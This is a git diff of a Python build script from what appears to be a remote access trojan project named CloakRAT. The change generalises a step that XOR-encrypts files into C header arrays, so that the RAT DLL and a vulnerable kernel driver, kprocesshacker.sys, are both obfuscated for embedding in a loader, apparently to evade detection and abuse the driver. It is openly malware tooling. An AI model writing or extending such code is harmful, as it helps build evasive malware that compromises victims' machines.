@@ -78,6 +78,12 @@ strings_to_encrypt = {
     'str_WSAGetLastError': 'WSAGetLastError',
 }
 
+# Add files paths here.
+files_list = {
+    'rat_dll': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
+    'vuln_driver': f'{CURR_DIR}\\kprocesshacker.sys'
+}
+
 def gen_key() -> list[int]:
         key = []
         for _ in range(KEY_ENTROPY):
@@ -137,16 +143,14 @@ def main():
             header_file.write(encrypted_c_arr + '\n')  # Example: static unsigned char str_kernel32_data[] = { ... };
             header_file.write(c_struct + '\n\n')  # Example: static EncryptedBytes str_kernel32 = { str_kernel32_data, sizeof(str_kernel32_data) };
             
-        # Encrypt the RAT dll
-        with open(f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll', 'rb') as rat_dll:
-            dll_bytes = rat_dll.read()
-            variable_name = 'rat_dll'
-            encrypted_c_dll_arr = to_c_array(variable_name, xor_encrypt(dll_bytes, key, byte_chiper))
-            
-            header_file.write(encrypted_c_dll_arr + '\n')
-            header_file.write(to_c_struct(variable_name) + '\n\n')
+        # Encrypt files (raw bytes)
+        for var_name, file_path in files_list.items():
+            with open(file_path, 'rb') as file:                
+                raw_bytes = file.read()
+                encrypted_c_arr = to_c_array(var_name, xor_encrypt(raw_bytes, key, byte_chiper))
 
-            
+                header_file.write(encrypted_c_arr + '\n')
+                header_file.write(to_c_struct(var_name) + '\n\n')
 
 if __name__ == '__main__':
         main()
